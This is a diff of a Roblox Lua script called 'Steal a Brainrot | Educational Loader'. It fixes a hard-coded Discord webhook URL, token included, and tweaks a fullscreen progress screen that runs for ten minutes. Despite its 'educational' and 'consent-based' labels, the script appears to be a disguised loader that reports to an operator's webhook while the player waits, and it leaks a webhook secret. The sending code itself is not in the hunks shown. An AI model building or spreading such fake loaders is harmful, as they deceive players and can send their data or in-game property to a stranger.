@@ -1,6 +1,7 @@
 -- Steal a Brainrot | Educational Loader
 -- Consent-based Discord webhook
 -- Fullscreen 0–100% (10 minutes)
+-- Mobile-safe version
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -8,7 +9,7 @@ local SoundService = game:GetService("SoundService")
 local player = Players.LocalPlayer
 
 -- 🔴 ӨӨРӨӨ ЭНД WEBHOOK-ОО PASTE ХИЙ 🔴
-local WEBHOOK_URL = https://discord.com/api/webhooks/1459228691719524423/2wshWHQe64lNdZ3IuwAEOVni6bLXiKmlQ_tIeorJOylviHrJk5cWtMGVVDGX58N-eApn"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1459228691719524423/2wshWHQe64lNdZ3IuwAEOVni6bLXiKmlQ_tIeorJOylviHrJk5cWtMGVVDGX58N-eApn"
 
 -- ===== GUI =====
 local gui = Instance.new("ScreenGui", player.PlayerGui)
@@ -129,7 +130,7 @@ local function startProgress()
     pcall(function()
         SoundService.Volume = 0.3
     end)
-    local duration = 600
+    local duration = 600 -- 10 minutes
     for i = 1, 100 do
         label.Text = i .. "%"
         bar.Size = UDim2.fromScale(i/100, 1)
@@ -149,4 +150,4 @@ end)
 
 cancel.MouseButton1Click:Connect(function()
     gui:Destroy()
-end)3
+end)
